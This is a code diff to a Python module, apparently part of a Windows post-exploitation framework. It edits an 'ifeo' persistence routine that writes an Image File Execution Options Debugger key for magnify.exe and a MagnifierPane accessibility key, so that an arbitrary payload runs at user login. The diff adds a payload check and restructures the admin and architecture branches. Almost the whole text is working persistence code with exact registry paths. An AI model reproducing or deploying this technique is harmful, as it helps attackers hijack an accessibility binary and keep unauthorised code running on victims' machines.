@@ -1,4 +1,6 @@
 import os
+import wmi
+import ctypes
 import _winreg
 from core.prints import *
 from core.utils import *
@@ -35,29 +37,33 @@ def create_debugger_key(path,payload):
 		return True
 
 def ifeo(payload):
-	if (information().admin() == True):
-		if ("64" in information().architecture()):
-			if (create_debugger_key("Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe",payload) == True):
-				print_success("Successfully created Debugger key containing payload ({})".format(os.path.join(payload)))
-				if (create_magnifierpane_key("Software\Microsoft\Windows NT\CurrentVersion\Accessibility") == True):
-					print_success("Successfully installed persistence, payload will run at login")
+	if (payloads().exe(payload) == True):
+		if (information().admin() == True):
+			if ("64" in information().architecture()):
+				if (create_debugger_key("Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe",payload) == True):
+					print_success("Successfully created Debugger key containing payload ({})".format(os.path.join(payload)))
+					if (create_magnifierpane_key("Software\Microsoft\Windows NT\CurrentVersion\Accessibility") == True):
+						print_success("Successfully installed persistence, payload will run at login")
+					else:
+						print_error("Unable to install persistence")
+						return False
 				else:
 					print_error("Unable to install persistence")
 					return False
 			else:
-				print_error("Unable to install persistence")
-				return False
+				if (create_debugger_key("Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe",payload) == True):
+					print_success("Successfully created Debugger key containing payload ({})".format(os.path.join(payload)))
+					if (create_magnifierpane_key("Software\Microsoft\Windows NT\CurrentVersion\Accessibility") == True):
+						print_success("Successfully installed persistence, payload will run at login")
+					else:
+						print_error("Unable to install persistence")
+						return False
+				else:
+					print_error("Unable to install persistence")
+					return False
 		else:
-			if (create_debugger_key("Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe",payload) == True):
-				print_success("Successfully created Debugger key containing payload ({})".format(os.path.join(payload)))
-				if (create_magnifierpane_key("Software\Microsoft\Windows NT\CurrentVersion\Accessibility") == True):
-					print_success("Successfully installed persistence, payload will run at login")
-				else:
-					print_error("Unable to install persistence")
-					return False
-			else:
-				print_error("Unable to install persistence")
-				return False
+			print_error("Cannot proceed, we are not elevated")
+			return False
 	else:
-		print_error("Cannot proceed, we are not elevated")
-		return False
+		print_error("Cannot proceed, invalid payload")
+		return False								
